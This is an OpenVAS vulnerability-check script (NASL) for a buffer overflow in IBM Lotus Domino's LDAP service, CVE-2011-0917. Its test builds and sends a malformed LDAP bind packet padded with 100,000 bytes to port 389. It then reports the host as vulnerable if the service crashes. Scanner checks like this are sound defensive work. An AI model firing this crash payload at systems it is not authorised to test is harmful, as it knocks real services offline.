###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ibm_lotus_domino_ldap_code_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# IBM Lotus Domino LDAP Bind Request Remote Code Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote attackers to execute arbitrary
  code within the context of the affected application.
  Impact Level: Application";
tag_affected = "IBM Lotus Domino versions 8.5.3 and prior.";
tag_insight = "The flaw is due to a boundary error within 'nLDAP.exe' when processing
  a LDAP Bind request packet which can be exploited to cause a buffer overflow
  via a specially crafted packet sent to port 389/TCP.";
tag_solution = "No solution or patch is available as of 29th April 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www-01.ibm.com/software/lotus/products/domino/";
tag_summary = "The host is running IBM Lotus Domino LDAP and is prone to remote code
  execution vulnerability.";

if(description)
{
  script_id(902421);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-09 15:38:03 +0200 (Mon, 09 May 2011)");
  script_cve_id("CVE-2011-0917");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("IBM Lotus Domino LDAP Bind Request Remote Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43224");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16190/");
  script_xref(name : "URL" , value : "http://zerodayinitiative.com/advisories/ZDI-11-047/");
  script_xref(name : "URL" , value : "http://www-01.ibm.com/support/docview.wss?uid=swg21461514");

  script_description(desc);
  script_summary("Determine BM Lotus Domino LDAP Remote Code Execution Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ldap", 389);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ldap.inc");

## Get LDAP Port
port = get_kb_item("Services/ldap");
if(!port) {
  port = 389;
}

## Check Port Status
if(!get_port_state(port)){
  exit(0);
}

if(!ldap_alive(port:port)){
  exit(0);
}

## LDAP SASL Bind Request
attack = raw_string(0x30, 0x83, 0x01, 0x00, 0x12, 0x02, 0x01, 0x01,
                    0x60, 0x83, 0x01, 0x00, 0x0A, 0x02, 0x01, 0x03,
                    0x04, 0x00, 0x80, 0x84, 0xFF, 0xFF, 0xFF, 0xFE) +
                    crap(data:raw_string(0x41), length: 100000);

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Sending Exploit
send(socket:soc, data:attack);

## Wait for 5 seconds
sleep(5);

## Check Port status
if(!ldap_alive(port:port)){
  security_hole(port);
}
